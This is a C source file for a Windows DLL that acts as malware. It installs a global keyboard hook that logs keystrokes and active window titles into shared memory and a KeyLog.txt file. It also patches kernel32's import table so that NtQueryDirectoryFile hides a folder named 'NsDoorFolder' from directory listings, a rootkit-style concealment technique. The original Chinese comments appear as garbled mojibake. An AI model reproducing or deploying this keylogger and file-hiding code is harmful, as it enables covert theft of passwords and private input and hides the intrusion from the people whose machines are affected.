#include "HookLib.h"

//////////////////////////////////////////////////////////////////////////
//�������ݶ�
//////////////////////////////////////////////////////////////////////////
#pragma data_seg(".MYDATA") 
//ȫ�ֱ���
char szText[MAXLENGTH] = "Start Hook";
#pragma data_seg () 
#pragma comment(linker,"/SECTION:.MYDATA,RWS") 

//////////////////////////////////////////////////////////////////////////
//ȫ�ֱ���
//////////////////////////////////////////////////////////////////////////
HHOOK hHook = NULL;
BOOL  flag = FALSE;
HWND  hLastWnd = NULL;
HINSTANCE hInstance = NULL;
//ԭʼZwQueryDirectoryFile��ַ
ZWQUERYDIRECTORYFILE   OldZwQueryDirectoryFile = NULL;
WCHAR HIDEFOLDER[] = L"NsDoorFolder";
BOOL bState = TRUE;

BOOL APIENTRY DllMain(HINSTANCE hModule,DWORD  dwReason,LPVOID lpReserved)
{
	hInstance = hModule;

	if (dwReason == DLL_PROCESS_ATTACH)
	{
		/*
		//HOOK ZwQueryDirectroyFile
		HookQueryFile(TRUE);
		*/
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		/*
		//UnHook ZwQueryDirectoryFile
		HookQueryFile(FALSE);
		*/
	}

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//�������̼��
//////////////////////////////////////////////////////////////////////////
EXPORT HHOOK StartHook(void)
{
	if (!flag)
	{
		hHook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)HookProc,hInstance,NULL);
	}

	return hHook;
}

//////////////////////////////////////////////////////////////////////////
//�رռ��̼��
//////////////////////////////////////////////////////////////////////////
EXTERNC EXPORT BOOL StopHook(void)
{
	if (flag)
	{
		UnhookWindowsHookEx(hHook);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//����ָ���ļ�
//////////////////////////////////////////////////////////////////////////
EXTERNC EXPORT BOOL HideFile(char* fname)
{
	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//���̹��ӹ���
//////////////////////////////////////////////////////////////////////////
EXPORT LRESULT  CALLBACK HookProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	LRESULT nRet = CallNextHookEx(hHook,nCode,wParam,lParam);

	HWND hWnd = GetActiveWindow();
	if (hWnd!=hLastWnd)
	{
		char szTemp[256] = {0};
		GetWindowText(hWnd,szTemp,sizeof(szTemp));
		sprintf(szText,"%s\r\n-------[%s]--------\r\n",szText,szTemp);
		hLastWnd = hWnd;
	}
	BYTE szKeyState[256] = {0};
	GetKeyboardState(szKeyState);
	int nScan = lParam>>16;
	WORD szKey = NULL;
	int len = ToAscii(wParam,nScan,szKeyState,&szKey,NULL);
	if (len>0)
	{	
		if (bState)
		{
			sprintf(szText,"%s%c",szText,char(szKey));
			bState = FALSE;
		}
		else
		{
			bState = TRUE;
		}
	}


	return nRet;
}

//////////////////////////////////////////////////////////////////////////
//���水����Ϣ
//////////////////////////////////////////////////////////////////////////
BOOL KeySave(char* szText)
{
	FILE	*fp;

	fp = fopen("KeyLog.txt","a");
	fputs(szText,fp);

	fclose(fp);


	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//�ļ����ز���
//////////////////////////////////////////////////////////////////////////



//////////////////////////////////////////////////////////////////////////
//�滻ԭ�к���
//////////////////////////////////////////////////////////////////////////
NTSTATUS WINAPI NewZwQueryDirectoryFile(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass,BOOLEAN ReturnSingleEntry,PUNICODE_STRING FileName,BOOLEAN RestartScan)
{
	//�ȵ���ԭ�к���
	LONG rret = OldZwQueryDirectoryFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,FileInformation,Length,FileInformationClass,ReturnSingleEntry,FileName,RestartScan);
	if (!NT_SUCCESS(rret))
	{
		return rret;
	}

	//ֻȡ��	FileBothDirectoryInformation���ֿ�����
	if (FileInformationClass==FileBothDirectoryInformation)
	{
		PFILE_BOTH_DIRECTORY_INFORMATION pFileInfo;
		PFILE_BOTH_DIRECTORY_INFORMATION pLastFileInfo;
		BOOLEAN flag;
		pFileInfo = (PFILE_BOTH_DIRECTORY_INFORMATION)FileInformation; 
		pLastFileInfo = NULL;
		do
		{
			flag = !( pFileInfo->NextEntryOffset );
			//���ַ��Ƚϣ�����WCSSTR
			if(wcsstr(pFileInfo->FileName,HIDEFOLDER)!=NULL)
			{
				if(flag) 
				{
					pLastFileInfo->NextEntryOffset = 0;
					break;
				} 
				else
				{
					int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pFileInfo->NextEntryOffset;
					memcpy( (PVOID)pFileInfo, (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), (DWORD)iLeft );
					continue;
				}
			}
			pLastFileInfo = pFileInfo;
			pFileInfo = (PFILE_BOTH_DIRECTORY_INFORMATION)((char *)pFileInfo + pFileInfo->NextEntryOffset);
		}while(!flag);

	}

	return rret;
}

//////////////////////////////////////////////////////////////////////////
//Hook Function
//////////////////////////////////////////////////////////////////////////
BOOL HookQueryFile(BOOL flag)
{
	//ȷ��Kernel32.dll�Ļ���ַ
	HMODULE hModule = LoadLibrary("kernel32.dll");
	if (hModule==NULL)
	{
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHdr->e_magic!=IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}

	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((ULONG)hModule+pDosHdr->e_lfanew);
	if (pNtHdr->Signature!=IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	if (pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress==NULL || 
		pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size==0)
	{
		return FALSE;
	}

	PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG)hModule+pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	PIMAGE_THUNK_DATA ThunkData;

	while (ImportDescriptor->FirstThunk)
	{
		char* szDll = (char*)((ULONG)hModule+ImportDescriptor->Name);
		//����Ѱ��Kernel32�м��ص�ntdll.dll
		if (stricmp(szDll,"ntdll.dll")!=NULL)
		{
			ImportDescriptor++;
			continue;
		}

		ThunkData = (PIMAGE_THUNK_DATA)((ULONG)hModule+ImportDescriptor->OriginalFirstThunk);

		int num = 1;
		while (ThunkData->u1.Function)
		{
			char* szFunc = (char*)((ULONG)hModule+ThunkData->u1.AddressOfData+2);
			if (stricmp(szFunc,"NtQueryDirectoryFile")==0)
			{
				PDWORD pFunc = (DWORD*)((ULONG)hModule+(DWORD)ImportDescriptor->FirstThunk)+(num-1);
				if (flag)
				{
					//Hook
					ULONG pNewFunc = (ULONG)NewZwQueryDirectoryFile;
					OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)(*(ULONG*)pFunc);
					DWORD dwWrite = 0;
					WriteProcessMemory(GetCurrentProcess(),pFunc,&pNewFunc,sizeof(ULONG),&dwWrite);					
				}
				else
				{
					//UnHook
					DWORD dwWrite = 0;
					WriteProcessMemory(GetCurrentProcess(),pFunc,(DWORD*)(&OldZwQueryDirectoryFile),sizeof(ULONG),&dwWrite);	
				}

				return TRUE;
			}
			num++;
			ThunkData++;
		}
		ImportDescriptor++;
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//��ȡ����
//////////////////////////////////////////////////////////////////////////
EXTERNC EXPORT char* GetText(void)
{
	return szText;
}